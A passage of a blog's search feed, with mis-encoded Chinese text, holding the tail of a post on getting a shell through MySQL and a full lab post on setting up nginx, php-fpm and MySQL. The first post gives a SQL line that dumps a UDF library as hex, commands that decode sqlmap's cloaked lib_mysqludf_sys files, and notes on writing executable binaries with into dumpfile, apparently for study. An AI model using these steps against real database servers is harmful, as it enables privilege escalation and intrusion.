å°çŸ¥è¯†ç‚¹</h2><h3 id="secure-file-privåœ¨ä¸åŒmysqlç‰ˆæœ¬çš„åŒºåˆ«"><a href="#secure-file-privåœ¨ä¸åŒmysqlç‰ˆæœ¬çš„åŒºåˆ«" class="headerlink" title="secure_file_privåœ¨ä¸åŒmysqlç‰ˆæœ¬çš„åŒºåˆ«"></a><strong>secure_file_privåœ¨ä¸åŒmysqlç‰ˆæœ¬çš„åŒºåˆ«</strong></h3><p>mysql5.5ä¹‹å‰secure_file_privé»˜è®¤æ˜¯ç©ºï¼Œè¿™ä¸ªæƒ…å†µå¯ä»¥è®©ä»»ä½•ç»å¯¹è·¯å¾„å†™æ–‡ä»¶ï¼Œ</p><p>mysql5.5-5.7ï¼Œsecure_file_privé»˜è®¤æ˜¯NULLï¼Œé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥ | å¯¼å‡ºï¼Œ</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131155508820.png" class="" title="image-20210131155508820"><p>mysqlç‰ˆæœ¬5.7ä¹‹åï¼Œsecure_file_privæ˜¯é»˜è®¤ç›®å½•,é™åˆ¶mysqld çš„å¯¼å…¥ | å¯¼å‡º åªèƒ½å‘ç”Ÿåœ¨é™å®šç›®å½•ä¸‹ã€‚</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131152927985.png" class="" title="image-20210131152927985"><h3 id="å¦‚ä½•è·å–è¯¥udf-dll-so-æ–‡ä»¶çš„16è¿›åˆ¶å€¼-hex"><a href="#å¦‚ä½•è·å–è¯¥udf-dll-so-æ–‡ä»¶çš„16è¿›åˆ¶å€¼-hex" class="headerlink" title="å¦‚ä½•è·å–è¯¥udf.dll(.so)æ–‡ä»¶çš„16è¿›åˆ¶å€¼(hex)"></a><strong>å¦‚ä½•è·å–è¯¥udf.dll(.so)æ–‡ä»¶çš„16è¿›åˆ¶å€¼(hex)</strong></h3><p>æˆ‘ä»¬å¯ä»¥æœ¬åœ°æ­å»ºmysqlç¯å¢ƒ æ‰¾ä¸ªå¯ä»¥ç”¨çš„udf.dllæ–‡ä»¶ æ‰§è¡Œä¸‹é¢æ“ä½œ</p><p>mysql&gt; select hex(load_file (â€˜c:/windows/temp/xxoo.dllâ€™)) into outfile â€˜c:/windows/temp/xxoo.txtâ€™;</p><h3 id="sqlmapçš„udf-dll-so-æ˜¯é€šè¿‡å¼‚æˆ–ç¼–ç çš„ï¼Œä½¿ç”¨ä¹‹å‰éœ€è¦è§£ç "><a href="#sqlmapçš„udf-dll-so-æ˜¯é€šè¿‡å¼‚æˆ–ç¼–ç çš„ï¼Œä½¿ç”¨ä¹‹å‰éœ€è¦è§£ç " class="headerlink" title="sqlmapçš„udf.dll(.so)æ˜¯é€šè¿‡å¼‚æˆ–ç¼–ç çš„ï¼Œä½¿ç”¨ä¹‹å‰éœ€è¦è§£ç "></a><strong>sqlmapçš„udf.dll(.so)æ˜¯é€šè¿‡å¼‚æˆ–ç¼–ç çš„ï¼Œä½¿ç”¨ä¹‹å‰éœ€è¦è§£ç </strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è§£ç å·¥å…·ä¸ºsqlmapè‡ªå¸¦çš„SQLmap\extra\cloak\cloak.py</span></span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\windows\<span class="number">64</span>\lib_mysqludf_sys.dll_</span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\linux\<span class="number">64</span>\lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131161956660.png" class="" title="image-20210131161956660"><h3 id="dumpfileå’Œoutfileæœ‰ä»€ä¹ˆä¸ä¸€æ ·"><a href="#dumpfileå’Œoutfileæœ‰ä»€ä¹ˆä¸ä¸€æ ·" class="headerlink" title="dumpfileå’Œoutfileæœ‰ä»€ä¹ˆä¸ä¸€æ ·"></a><strong>dumpfileå’Œoutfileæœ‰ä»€ä¹ˆä¸ä¸€æ ·</strong></h3><p>outfileé€‚åˆå¯¼åº“ï¼Œä¼šåœ¨è¡Œæœ«å°¾ä¼šå†™å…¥æ–°è¡Œå¹¶è½¬ä¹‰ï¼Œå› æ­¤ä¸èƒ½å†™å…¥äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>into dumpfile å°±èƒ½å¯¼å‡º ä¸€ä¸ªå®Œæ•´èƒ½æ‰§è¡Œçš„2è¿›åˆ¶æ–‡ä»¶ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a class="link"   href="https://www.cnblogs.com/sijidou/p/10522972.html" >udfææƒ<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://blog.csdn.net/weixin_39872872/article/details/112589789" >å†™å…¥mysql_é€šè¿‡MySQLå†™å…¥webshellçš„å‡ ç§æ–¹å¼<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.cnblogs.com/milantgh/p/5444398.html" >mysql dumpfileä¸outfileå‡½æ•°çš„åŒºåˆ«<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ‰‹åŠ¨æ­å»ºnginx+php-fpm+mysqlç¯å¢ƒ--ä¿¡å®‰ä¹‹è·¯å®éªŒ</title>
      <link href="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/"/>
      <url>/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-å…³é”®è¿‡ç¨‹"><a href="#0x01-å…³é”®è¿‡ç¨‹" class="headerlink" title="0x01 å…³é”®è¿‡ç¨‹"></a>0x01 å…³é”®è¿‡ç¨‹</h2><h3 id="1-å®‰è£…nigix"><a href="#1-å®‰è£…nigix" class="headerlink" title="1.å®‰è£…nigix"></a>1.å®‰è£…nigix</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nginx#å®‰è£…nginx</span><br><span class="line">service nginx start#å¯åŠ¨nginx</span><br></pre></td></tr></table></figure><p>å®‰è£…åæµè§ˆå™¨è®¿é—®æœ¬åœ°ipã€‚</p><img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564584947181.png" class="" width="1564584947181"><h3 id="2-å®‰è£…php7-2-fpmå’Œé…ç½®nginx"><a href="#2-å®‰è£…php7-2-fpmå’Œé…ç½®nginx" class="headerlink" title="2.å®‰è£…php7.2-fpmå’Œé…ç½®nginx"></a>2.å®‰è£…php7.2-fpmå’Œé…ç½®nginx</h3><ol><li><p><strong>å®‰è£…php7.2</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.2-fpm</span><br></pre></td></tr></table></figure></li><li><p><strong>ä¿®æ”¹nginxé…ç½®æ–‡ä»¶</strong></p><p>ä¸ºä½¿nginxæ”¯æŒphpè§£æï¼Œéœ€è®¾ç½®fastcgiè§£æå™¨çš„è·¯å¾„ï¼Œä¿®æ”¹nginxå®‰è£…ç›®å½•çš„æ–‡ä»¶<code>/etc/nginx/sites-available/default</code>ï¼Œå¦‚å›¾ã€‚</p><img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564585815801.png" class="" width="1564585815801"><p>é‡å¯nginxã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx reload</span><br></pre></td></tr></table></figure></li><li><p><strong>è®¾ç½®php-fpmçš„ç›‘å¬ç«¯å£</strong></p><p>ä¿®æ”¹php-fpmå®‰è£…ç›®å½•ä¸‹é…ç½®æ–‡ä»¶<code>/etc/php/7.2/fpm/pool.d/www.conf</code>ï¼ŒæŸ¥çœ‹æ˜¯å¦åŒnginxé…ç½®æ–‡ä»¶çš„è·¯å¾„æˆ–ç›‘å¬çš„ç«¯å£ä¸€è‡´ï¼Œå¦‚å›¾ã€‚</p><img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564586839658.png" class="" width="1564586839658"></li><li><p><strong>æµ‹è¯•é…ç½®æ˜¯å¦æˆåŠŸ</strong></p><p>è¿›å…¥<code>/var/www/html/</code>ç›®å½•ä¸‹æ·»åŠ <code>test.php</code>æµ‹è¯•æ–‡ä»¶ï¼Œæµè§ˆå™¨è®¿é—®ï¼ˆè‹¥ç¬¬ä¸‰æ­¥æœªé…ç½®ä¼šæŠ¥502é”™è¯¯ï¼‰ï¼Œé…ç½®æˆåŠŸæƒ…å†µå¦‚ä¸‹å›¾ã€‚</p></li></ol><img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564587125109.png" class="" width="1564587125109"><h3 id="3-å®‰è£…mysql"><a href="#3-å®‰è£…mysql" class="headerlink" title="3.å®‰è£…mysql"></a>3.å®‰è£…mysql</h3><ol><li><p>å®‰è£…mysql</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install mysql-server mysql-client#å®‰è£…mysql</span><br><span class="line">apt-get install php7.2-mysql#å®‰è£…phpæ”¯æ’‘mysqlçš„æ¨¡å—</span><br></pre></td></tr></table></figure></li><li><p>åœ¨è®¾ç½®å¥½mysqlå¯†ç åï¼Œä½¿ç”¨<code>systemctl status mysql</code>æŸ¥çœ‹mysqlçŠ¶æ€ï¼Œè‹¥ä¸ºactiveåˆ™å¯æµ‹è¯•é“¾æ¥</p><img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564630920244.png" class="" width="1564630920244"><p>3.æµ‹è¯•php7é“¾æ¥æ•°æ®åº“</p><img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564631058876.png" class="" width="1564631058876"></li></ol><h2 id="0x02-å‘ç‚¹"><a href="#0x02-å‘ç‚¹" class="headerlink" title="0x02 å‘ç‚¹"></a>0x02 å‘ç‚¹</h2><p>1.é…ç½®nginxå®‰è£…è·¯å¾„ä¸‹çš„/etc/nginx/sites-enabled/defaultæ–‡ä»¶æ—¶ï¼Œfastcgi_passåªèƒ½æœ‰ä¸€ä¸ªï¼Œå¦åˆ™nigixå¯åŠ¨ä¼šæŠ¥é”™</p><img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564582956194.png" class="" width="1564582956194"><p>2.å½“php7ä½¿ç”¨mysql_connectå‡½æ•°é“¾æ¥mysqlæ•°æ®åº“æ²¡æœ‰è¿”å›å€¼ï¼Œåœ¨php.iniä¸­è®¾ç½®error_reporting  =  E_ALLï¼Œdisplay_errors = Onï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•æŠ¥é”™ä¿¡æ¯ï¼åå‚è€ƒ<a class="link"   href="https://blog.csdn.net/Brouce__Lee/article/details/94188470" >æ–‡ç« <i class="fas fa-external-link-alt"></i></a> ï¼Œå‘ç°æ˜¯mysql_connectæ”¯æŒçš„æ˜¯php5ï¼Œè€Œæˆ‘è£…çš„æ˜¯php7ï¼Œæ”¹ç”¨mysqliå‡½æ•°æˆåŠŸé“¾æ¥æ•°æ®åº“</p><h2 id="0x03-å‚è€ƒé“¾æ¥"><a href="#0x03-å‚è€ƒé“¾æ¥" class="headerlink" title="0x03 å‚è€ƒé“¾æ¥"></a>0x03 å‚è€ƒé“¾æ¥</h2><p>nginx+php+fpmè¿è¡ŒåŸç†  <a class="link"   href="https://segmentfault.com/a/1190000023097951" >https://segmentfault.com/a/1190000023097951<i class="fas fa-external-link-alt"></i></a></p><p>phpä¹‹å‡½æ•°mysql_connectè¿æ¥mysqlæ²¡æœ‰ä»»ä½•è¿”å›å€¼ï¼ˆ2019å¹´ï¼‰<a class="link"   href="https://blog.csdn.net/Brouce__Lee/article/details/94188470" >https://blog.csdn.net/Brouce__Lee/article/details/94188470<i class="fas fa-external-link-alt"></i></a></p><p>lnpmç¯å¢ƒæ­å»ºè¿‡ç¨‹  <a class="link"   href="https://www.imooc.com/article/32579" >https://www.imooc.com/article/32579<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
